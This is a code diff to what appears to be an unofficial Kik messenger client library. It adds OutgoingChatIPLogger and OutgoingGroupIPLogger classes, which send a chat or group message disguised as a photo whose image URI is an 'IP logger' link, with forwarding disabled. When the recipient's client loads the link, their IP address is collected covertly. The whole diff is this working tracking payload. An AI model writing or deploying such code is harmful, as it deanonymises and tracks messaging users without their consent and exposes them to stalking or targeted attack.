@@ -367,6 +367,55 @@ class OutgoingFakeStatusMessage(XMPPElement):
         return data.encode()
 
 
+class OutgoingChatIPLogger(XMPPElement):
+    """
+    Represents an outgoing IP logger to another kik entity (member or group)
+    """
+    def __init__(self, peer_jid, ip_logger_link, is_group=False):
+        super().__init__()
+        self.peer_jid = peer_jid
+        self.ip_logger_link = ip_logger_link
+        self.is_group = is_group
+        # self.icon = icon_src.icon
+
+    def serialize(self):
+        message_type = "chat" if not self.is_group else "groupchat"
+        timestamp = str(int(round(time.time() * 1000)))
+        data = ('<message type="{0}" to="{1}" id="{2}" cts="{3}">'
+                '<pb></pb>'
+                '<kik push="true" qos="true" timestamp="{3}" />'
+                '<request xmlns="kik:message:receipt" r="true" d="true" />'
+                '<content id="{4}" app-id="kik.android" v="2">'
+                '<strings>'
+                '<app-name></app-name>'
+                '<allow-forward>false</allow-forward>'
+                '<app-pkg>kik.android</app-pkg>'
+                '<layout>photo</layout>'
+                '</strings>'
+                '<extras />'
+                '<hashes />'
+                '<images>'
+                '<icon>{5}</icon>'
+                '<preview></preview>'
+                '</images>'
+                '<uris>'
+                '<uri type="image">{6}</uri>'
+                '</uris>'
+                '</content>'
+                '</message>'
+                ).format(message_type, self.peer_jid, self.message_id, timestamp,
+                self.content_id, '76KV', self.ip_logger_link)
+        return data.encode()
+
+
+class OutgoingGroupIPLogger(OutgoingChatIPLogger):
+    """
+    Represents an outgoing IP logger to a group
+    """
+    def __init__(self, group_jid, ip_logger_link):
+        super().__init__(group_jid, ip_logger_link, is_group=True)
+
+
 class IncomingMessageReadEvent(XMPPResponse):
     def __init__(self, data: BeautifulSoup):
         super().__init__(data)
